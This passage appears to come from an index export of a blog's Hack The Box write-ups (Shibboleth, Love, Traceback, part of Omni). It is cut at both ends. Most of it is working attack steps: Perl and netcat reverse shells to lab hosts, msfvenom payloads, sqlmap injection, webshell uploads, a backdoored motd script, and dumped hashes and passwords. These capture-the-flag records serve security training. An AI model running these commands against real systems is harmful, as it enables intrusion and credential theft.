20211124085038.png]]\nIn the top right corner, press Create Item. Name it to whatever and in the Key-field execute code with the syntax: system.run[command]. Save your new item, press on it to and in the bottom row press Execute now. A simple ping POC would look like this:\n![[Pasted image 20211124085238.png]]\n![[Pasted image 20211124085403.png]]\nTrying to execute one liners directly through the GUI gives me a shell that closes down only after a few seconds. So instead I host a local HTTP Server that exposes a pearl one-liner, and trigger it using curl from the GUI.\n$ cat rev.sh      \nperl -e 'use Socket;$i=\"10.10.14.6\";$p=4488;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&S\");open(STDOUT,\"&gt;&S\");open(STDERR,\"&gt;&S\");exec(\"/bin/sh -i\");};'\n![[Pasted image 20211124092000.png]]\n┌──(void㉿void)-[/htb/shibboleth]\n└─$ nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.6] from (UNKNOWN) [10.10.11.124] 38550\n/bin/sh: 0: can't access tty; job control turned off\n$ id && hostname\nuid=110(zabbix) gid=118(zabbix) groups=118(zabbix)\nshibboleth\n\n\n\nStep 4\nThe admin loves password re-use; change to user ipmi-svc password ilovepumkinpie1.\nzabbix@shibboleth:/$ su ipmi-svc\nPassword: ilovepumkinpie1\nipmi-svc@shibboleth:/$ cd \nipmi-svc@shibboleth:~$ cat user.txt \n1c61257210be4a423aeae88f727c2412\n\n\n\n\nROOT\n\nStep 1\n\nSorry, user ipmi-svc may not run sudo on shibboleth.\n\nLooking for passwords etc in /etc/zabbix we find database credentials. From the database we are able to extract three bcrypt ($2*$) hashes, however we already know Administrator.\nipmi-svc@shibboleth:/etc/zabbix$ cat zabbix_server.conf\n[... snip ...]\nDBName=zabbix\nDBUser=zabbix\nDBPassword=bloooarskybluh\n\nipmi-svc@shibboleth:/etc/zabbix$ mysql zabbix -u zabbix -p\nEnter password: bloooarskybluh\n\nMariaDB [zabbix]&gt; show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| zabbix             |\n+--------------------+\n\nMariaDB [zabbix]&gt; select * from users;\n+--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+---------------+---------------+---------------+\n| userid | alias         | name         | surname       | passwd                                                       | url | autologin | autologout | lang  | refresh | type | theme      | attempt_failed | attempt_ip    | attempt_clock | rows_per_page |\n+--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+---------------+---------------+---------------+\n|      1 | Admin         | Zabbix       | Administrator | $2y$10$L9tjKByfruByB.BaTQJz/epcbDQta4uRM/KySxSZTwZkMGuKTPPT2 |     |         0 | 0          | en_GB | 60s     |    3 | dark-theme |              0 | 192.168.139.9 |    1619285020 |            50 |\n|      2 | guest         |              |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |         0 | 15m        | en_GB | 30s     |    1 | default    |              0 |               |             0 |            50 |\n|      3 | Administrator | IPMI Service | Account       | $2y$10$FhkN5OCLQjs3d6C.KtQgdeCc485jKBWPW4igFVEgtIP3jneaN7GQe |     |         0 | 0          | en_GB | 60s     |    2 | default    |              0 |               |             0 |            50 |\n+--------+---------------+--------------+---------------+--------------------------------------------------------------+-----+-----------+------------+-------+---------+------+------------+----------------+---------------+---------------+---------------+\nCracking the hashes is however useless and probably a rabbit hole. Guest comes back empty and after 30 minutes I gave up with Admin.\n\n\n\nStep 2\nDigging around further into the running process we can see that mysql is running as root, something that’s not best practice at all.\nipmi-svc@shibboleth:/etc/ayelow$ ps aux | grep root\n[... snip ...]\nroot        1252  0.0  0.0   2608  1732 ?        S    07:08   0:00 /bin/sh /usr/bin/mysqld_safe\nroot        1412  0.5  3.5 1729516 143560 ?      Sl   07:08   0:49 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=root --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock\nReading around for vulnerabilities for MariaDB v10.3.25 I come across CVE-2021-27928 which allows an authenticated attacker to execute OS commands as the user running the SQL service. Sound perfect to us!\n┌──(void㉿void)-[/htb/shibboleth]\n└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4499 -f elf-so -o CVE-2021-27928.so\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 74 bytes\nFinal size of elf-so file: 476 bytes\nSaved as: CVE-2021-27928.so\nipmi-svc@shibboleth:/dev/shm$ wget http://10.10.14.6/CVE-2021-27928.so\nipmi-svc@shibboleth:/dev/shm$ mysql -u zabbix -p -h 127.0.0.1 -e 'SET GLOBAL wsrep_provider=\"/dev/shm/CVE-2021-27928.so\";'\nEnter password: \nERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query\n┌──(void㉿void)-[/htb/shibboleth]\n└─$ nc -lvnp 4499                                                                                     \nlistening on [any] 4499 ...\nconnect to [10.10.14.6] from (UNKNOWN) [10.10.11.124] 33832\nid && hostname\nuid=0(root) gid=0(root) groups=0(root)\nshibboleth\n\ncat /root/root.txt\n04543075052e692020a01b60d8670c0f\n\ncat /etc/shadow\n[... snip ...]\nroot:$6$HeRqkRJL9pttp4EY$TBE4vztPy9lOaywPhVdhQHwiPa09s7RJw418EMjmS0RKea/1QBwLqTHK84ato5yDBF59dMvSNbQQ1pVy.K1dp.:18741:0:99999:7:::\nipmi-svc:$6$rnKUQQE9QwT1bVVt$7JWeqxtaYfMZa0EO0clguLK4Fh3N/IN6djXUl2M2MQ5PHVmQ1vLwlxnNMVhn7y/oEpjltVyvbw1wbBBZ//apV.:18925:0:99999:7:::\n\n\n\n\nReferences\nzabbix agent code execution: https://stackoverflow.com/questions/24222086/how-to-run-command-on-zabbix-agents\nmariadb os command execution: https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html"
  },
  {
    "objectID": "posts/2021-05-06-htb-writeup-love/2021-05-06-htb-writeup-love.html",
    "href": "posts/2021-05-06-htb-writeup-love/2021-05-06-htb-writeup-love.html",
    "title": "love - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:~]# nmap -Pn -n -sCV –open 10.129.128.34 PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: Voting System using PHP 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: 403 Forbidden | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in | Not valid before: 2021-01-18T14:00:16 |Not valid after: 2022-01-18T14:00:16 |ssl-date: TLS randomness does not represent time | tls-alpn: | http/1.1 445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql? | fingerprint-strings: | ms-sql-s: | Host ‘10.10.14.51’ is not allowed to connect to this MariaDB server 5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: 403 Forbidden 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.91%I=7%D=5/5%Time=60927F1A%P=x86_64-pc-linux-gnu%r(ms- SF:sql-s,4A,“F\\0\\004Host‘10.10.14.51’20is20not20al SF:lowed20to20connect20to20this20MariaDB20server”); Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results: |clock-skew: mean: 41m35s, deviation: 4h02m31s, median: -1h38m26s | smb-os-discovery: | OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3) | OS CPE: cpe:/o:microsoft:windows_10::- | Computer name: Love | NetBIOS computer name: LOVE | Workgroup: WORKGROUP | System time: 2021-05-05T02:40:28-07:00 | smb-security-mode: | account_used:  | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-05-05T09:40:26 |_ start_date: N/A\n\nSSL Cert CN: staging.love.htb\nMariaDB backend (MySQL)\n\nDIRB: + http://love.htb/index.php (CODE:200|SIZE:4388) + http://love.htb/admin/index.php (CODE:200|SIZE:6198) ==&gt; DIRECTORY: http://love.htb/plugins/ ==&gt; DIRECTORY: http://love.htb/images/ ==&gt; DIRECTORY: http://love.htb/dist/ ==&gt; DIRECTORY: http://love.htb/includes/ ==&gt; DIRECTORY: http://love.htb/admin/includes/ + http://staging.love.htb/index.php (CODE:200|SIZE:5357)\nNIKTO: -\n\nVisiting http://love.htb we are presented with a login prompt, lets try to inject some code in it.\n\nNOTE: THIS IS A BIG RABBIT HOLE!\nRequst: voter=1111’–&password=1111&login=\n\nResponse:\n\nTrying to get property ‘num_rows’ of non-object in C:.php\n\n\nWe have SQL injection! Lets simplify it using SQLmap.\n[root:/git/htb/love]# cat req.txt (master✱) POST /login.php HTTP/1.1 Host: love.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 58 Origin: http://love.htb Connection: close Referer: http://love.htb/index.php Cookie: PHPSESSID=0fg0p0lgce3kitltnvd8r2bvst Upgrade-Insecure-Requests: 1\nvoter=*&password=1111&login=\n[root:/git/htb/love]# sqlmap -r req.txt –threads=10 –dbs .. available databases [6]: [*] information_schema [*] mysql [*] performance_schema [*] phpmyadmin [*] test [*] votesystem\n[root:/git/htb/love]# sqlmap -r req.txt –threads=10 -D votesystem –tables Database: votesystem [5 tables] +————+ | admin | | candidates | | positions | | voters | | votes | +————+\n[root:/git/htb/love]# sqlmap -r req.txt –threads=10 -D votesystem -T admin –columns Database: votesystem Table: admin [7 columns] +————+————–+ | Column | Type | +————+————–+ | created_on | date | | firstname | varchar(50) | | id | int(11) | | lastname | varchar(50) | | password | varchar(60) | | photo | varchar(150) | | username | varchar(50) | +————+————–+\n[root:/git/htb/love]# sqlmap -r req.txt –threads=10 -D votesystem -T admin -C username,password –dump [12:31:01] [INFO] retrieved: admin Database: votesystem Table: admin [1 entry] +———-+————————————————————–+ | username | password | +———-+————————————————————–+ | admin | $2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC | +———-+————————————————————–+\nLets go for login credentials, targeting the voters table. [root:/git/htb/love]# sqlmap -r req.txt –threads=10 -D votesystem -T voters –columns Database: votesystem Table: voters [6 columns] +———–+————–+ | Column | Type | +———–+————–+ | firstname | varchar(30) | | id | int(11) | | lastname | varchar(30) | | password | varchar(60) | | photo | varchar(150) | | voters_id | varchar(15) | +———–+————–+\n[root:/git/htb/love]# sqlmap -r req.txt –threads=10 -D votesystem -T voters -C voters_id,password –dump [12:49:47] [WARNING] table ‘voters’ in database ‘votesystem’ appears to be empty Database: votesystem Table: voters [0 entries] +———–+———-+ | voters_id | password | +———–+———-+ +———–+———-+\nNothing to be found here.. trying the other tables result in the same, empty, output. The admin hash we found earlier is a ‘bcrypt \\(2*\\), Blowfish (Unix)’ (-m3200) hash, and unfortunately it’s a pain to crack.\n\nInstead, we shift focus to the vhost, staging.love.htb. Directly we find an interesting scanner function at http://staging.love.htb/beta.php where we can enter urls to scan. Trying the usual reverse shells only prints them out, so it feels more like it’s just printing the file (like a cURL), rather then executing them in a sandbox environment.\n\nSo lets try to read internal files from the victim box.\nScan ‘http://127.0.0.1/server-info’ and we find all the interesting web info, among other - the overlooked web port 5000. Scan ‘http://127.0.0.1:5000’ this time and we find creds!\n‘Vote Admin Creds admin: @LoveIsInTheAir!!!!’\n\nLogin with admin:@LoveIsInTheAir!!!! on http://love.htb/admin/index.php and we find the admin’s name - Neovic Devierte. We cant do much once logged in, however we can upload a profile image. There don’t seem to be any health checks on the uploaded file, meaning we can upload whatever we want.\n\nUpload a webshell, and from there trigger a reverse shell using smbserver.py and nc64.exe.\n\nUpload webshell.php and visit: http://love.htb/images/webshell.php\nStart smb in a dir containing nc64.exe: [root:/srv/pub-share]# smbserver.py share .\nExecute the reverse connection: //10.10.14.51/share/nc64.exe 10.10.14.51 4488 -e powershell\n[root:/git/htb/love]# rlwrap nc -lvnp 4488 (master✱) listening on [any] 4488 … connect to [10.10.14.51] from (UNKNOWN) [10.129.128.40] 64259 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.\nTry the new cross-platform PowerShell https://aka.ms/pscore6\nPS C:&gt; whoami love\n\n\nGrab user.txt\n\nPS C:&gt; type user.txt 3f7eb90595f1bd4bfc90f71350954198\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nStart by running winPEAS.bat, reading it thoroughly we see that ‘AlwaysInstallElevated’ is enabled.\n\nPS C:&gt; //10.10.14.51/share/winPEAS.bat .. ---------------&gt; [+] AlwaysInstallElevated? &lt;--------------- [i] If ‘1’ then you can install a .msi file with admin privileges ;) [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated\nHKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n    AlwaysInstallElevated    REG_DWORD    0x1\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\n    AlwaysInstallElevated    REG_DWORD    0x1\n\nCreate a reverse msi-payload, upload it to the victim and trigger to grab a SYSTEM session.\n\n[root:/git/htb/love]# msfvenom –platform windows –arch x64 –payload windows/x64/shell_reverse_tcp LHOST=10.10.14.51 LPORT=4499 –format msi –out AlwaysInstallElevated.msi No encoder specified, outputting raw payload Payload size: 460 bytes Final size of msi file: 159744 bytes Saved as: AlwaysInstallElevated.msi\nC:&gt;copy \\10.10.14.51.msi . PS C:&gt; msiexec /quiet /qn /i AlwaysInstallElevated.msi\n[root:/git/htb/love]# nc -lvnp 4499 (master✱) listening on [any] 4499 … connect to [10.10.14.51] from (UNKNOWN) [10.129.128.40] 64323 Microsoft Windows [Version 10.0.19042.928] (c) Microsoft Corporation. All rights reserved.\nC:\\WINDOWS\\system32&gt; whoami\n  nt authority\\system\n\nC:\\WINDOWS\\system32&gt; type C:\\Users\\Administrator\\Desktop\\root.txt\n  a9ace27cdf26ccc8a607e4f296791c4c\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nAlwaysInstallElevated: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated"
  },
  {
    "objectID": "posts/2020-04-20-htb-writeup-traceback/2020-04-20-htb-writeup-traceback.html",
    "href": "posts/2020-04-20-htb-writeup-traceback/2020-04-20-htb-writeup-traceback.html",
    "title": "Traceback - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@p3:/opt/htb/machines/traceback# nmap -Pn -sC -sV -n 10.10.10.181 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nDIRB: + http://traceback.htb/index.html (CODE:200|SIZE:1113) + http://traceback.htb/server-status (CODE:403|SIZE:301)\nNIKTO: -\n\nVisiting the webpage tells us that the site has been owned and they’ve left a backdoor. Inspecting the code we find a comment “Some of the best web shells that you might need ;)”. Googling “best web shells you might need” and the first site that pops up is a github repo with 16 diffrenet webshells.\nCopy the name of all the shells and add them to a custom wordlist. Use ffuf with the wordlist to find entry point.\nroot@p3:/opt/htb/machines/traceback# cat shell-list.txt alfa3.php alfav3.0.1.php andela.php bloodsecv4.php by.php c99ud.php cmd.php configkillerionkros.php jspshell.jsp mini.php obfuscated-punknopass.php punk-nopass.php punkholic.php r57.php smevk.php wso2.8.5.php\n\nroot@p3:~# ffuf -c -w /opt/htb/machines/traceback/shell-list.txt -u http://traceback.htb/FUZZ\n      /'___\\  /'___\\           /'___\\\n     /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n     \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n      \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n       \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n        \\/_/    \\/_/   \\/___/    \\/_/\n\n     v1.0-rc1\n\n:: Method : GET :: URL : http://traceback.htb/FUZZ :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________\nsmevk.php [Status: 200, Size: 1261, Words: 318, Lines: 59]\n\nBrowsing to http://traceback.htb/smevk.php we are prompted with a login, looking through the code of smevk.php the default credentials are admin:admin. Executing this gives us access to the webshell.\nSetup a local ncat listener and get a reverse shell using a nc reverse one-liner.\nWebshell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&1|nc 10.10.14.26 4488 &gt;/tmp/f\nroot@p3:~# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.26] from (UNKNOWN) [10.10.10.181] 46118 /bin/sh: 0: can’t access tty; job control turned off $ whoami webadmin\nUpgrade the shell from TTY0.\nUser webadmin doesn’t have user.txt in his home dir, however we find note.txt saying; $ cat note.txt\n\nsysadmin - I have left a tool to practice Lua. I’m sure you know where to find it. Contact me if you have any question.\n\nExecuting ‘sudo -l’ we find that sysadmin can execute ‘/home/sysadmin/luvit’ without password. We need to research how to get a shell using lua.\nGoogling for LUA Command Execution it seems that we can use the syntax ‘os.execute(COMMAND)’. We create a new .lua-file and create a new shell.\nwebadmin@traceback:/dev/shm$ cat privesc.lua os.execute(“/bin/sh”)\nwebadmin@traceback:/dev/shm$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua $ whoami sysadmin $ pwd /home/sysadmin $ cat user.txt f7a5bca29a0cdd67acba531d9550b636\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nIn /opt we find a motd-file containing; $ cat /opt/owned.msg ################################# ——– OWNED BY XH4H ———\n\nI guess stuff could have been configured better ^^ - #################################\n\nIf the motd has been defaced, we can use this to execute vulnerable code to grant a reverse root shell. However to trigger it we need to login using SSH.\nCreate a new ssh-key and add the public key to sysadmin’s authorized_keys.\nroot@p3:/opt/htb/machines/traceback# ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa): /opt/htb/machines/traceback/sysadmin-id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /opt/htb/machines/traceback/sysadmin-id_rsa. Your public key has been saved in /opt/htb/machines/traceback/sysadmin-id_rsa.pub.\nroot@p3:/opt/htb/machines/traceback# cat sysadmin-id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCkmo0hX72gdRRA76cwb1WudNaG9c0IvdH+zb3te3KKz9fBrDdUkCaOat7dd+zqFXBavb89LjMkCYWymnQcggyndR+yCAZr3/eYJRB+iZBjVpqxKJsHOL2m/3zwk+yLGQxz+Z/IKA7IKC89RdP5DKf7HhBhPnx0Hgg1CKRUs1ey9BrJhRo6yhCKT/fYofczg3OIBLYQYhyR5Tr2oyszrlhguPuA8SmUhoeK4sHvvWWhx1sq4qLeuHRLFM2xmJ/e5NKMWy+vgtiJTcl2WRl7/OVKNK2LHReoudUHv6AvRZp8VwpNcHES59SslHInrP/j6wQ/IdnXEG41Lk6I2j1vsVTYCQ462kf2vvSvlqxhpWhrysgSn+cCGSC+rgPUC3WTNpbTbdXPfiY7+VGbpuf7x/dffe56d+hm0Z+mzoMo1Bj3rTzRYX/ltpAypBebaUnsGtkbLzOHGaLna3F3i6yiK3YpFE0HOWmEky8jElP9q/4adoLeofNM19mf/g0FA5COzHk= root@p3\nCopy the public key to /home/sysadmin/.ssh/authorized_keys and login using SSH. root@p3:/opt/htb/machines/traceback# ssh sysadmin@traceback.htb -i sysadmin-id_rsa The authenticity of host ‘traceback.htb (10.10.10.181)’ can’t be established. ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added ‘traceback.htb,10.10.10.181’ (ECDSA) to the list of known hosts. ################################# ——– OWNED BY XH4H ———\n\nI guess stuff could have been configured better ^^ - #################################\n\nWelcome to Xh4H land\nLast login: Mon Mar 16 03:50:24 2020 from 10.10.14.2 $ whoami sysadmin\nEdit the motd header (/etc/update-motd.d/00-header) and add a nc reverse shell in the script\n$ cat 00-header #!/bin/sh .. echo “to Xh4H land ” rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&1|nc 10.10.14.26 4400 &gt;/tmp/f\nStart a nc listener and login as sysadmin to trigger the reverse shell.\nroot@p3:~# nc -lvnp 4400 listening on [any] 4400 … connect to [10.10.14.26] from (UNKNOWN) [10.10.10.181] 50498 /bin/sh: 0: can’t access tty; job control turned off # whoami root # cat /root/root.txt b359a978f9b54e5d538fcbe4ffd4eaa8\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nWebshell: https://github.com/TheBinitGhimire/Web-Shells\nLUA Command Execution: https://stackoverflow.com/questions/9676113/lua-os-execute-return-value\nMOTD Tampering: https://blog.haao.sh/writeups/fowsniff-writeup/"
  },
  {
    "objectID": "posts/2020-09-02-htb-writeup-omni/2020-09-02-htb-writeup-omni.html",
    "href": "posts/2020-09-02-htb-writeup-omni/2020-09-02-htb-writeup-omni.html",
    "title": "Omni - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@nidus:/git/htb# nmap -Pn -sC -sV -n 10.10.10.194 PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 5985/tcp open wsman 8080/tcp open upnp Microsoft IIS httpd | http-auth: | HTTP/1.1 401 Unauthorized0D |_ Basic realm=Windows Device Portal |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Site doesn’t have a title. 29817/tcp open unknown 29819/tcp open unknown 29820/tcp open unknown Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\nVisiting port 8080 we are met with a login prompt to “Windows Device Portal”. Googling about it the default credentials are Administrator:p@ssw0rd however they do not work. Reading more tells us this is for OS Windows 10 IoT Core, on Raspberry Pie.\nThere are known vulnerabilities and exploits for Win 10 IoT Core, one among them is SirepRAT giving the attacker unauthenticated RCE. Reading the In-Depth paper of IoT Core (Linked below) you’ll find a lot of great information regarding the webserver, how to change Administrator password etc.\nDownload SirepRAT and start to poke the target to verify code execution. I tried to change the Administartor password but got “Access is denied”, confirming RCE.\nroot@nidus:/git/htb/omni/SirepRAT# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput –return_output –as_logged_on_user –cmd “C:.exe” –args ” /c net user Administrator 123Abc!” &lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt; &lt;OutputStreamResult | type: 11, payload length: 53, payload peek: ‘System error 5 has occurred.Access is denied.’&gt;\nGet a reverse shell, easiest in my opinion is to use nc64.exe from your own SMB-share to trigger a shell. root@nidus:/git/htb/omni/SirepRAT# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput –return_output –as_logged_on_user –cmd “C:.exe” –args ” /c //10.10.14.4/pub-share/nc64.exe 10.10.14.4 4488 -e powershell”\nroot@nidus:~# rlwrap nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.4] from (UNKNOWN) [10.10.10.204] 49672 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.\nPS C:&gt;\nEnumerate the box and instantly we notice that “whoami” doesn’t work, nor do we have any valid users in C:. We can confirm the user by running “$env:UserName” - giving us user DefaultAccount.\nPS C:&gt; $env:UserName $env:UserName DefaultAccount\nPS C:&gt; Get-PSDrive Get-PSDrive\n\n\n\nName\nUsed (GB)\nFree 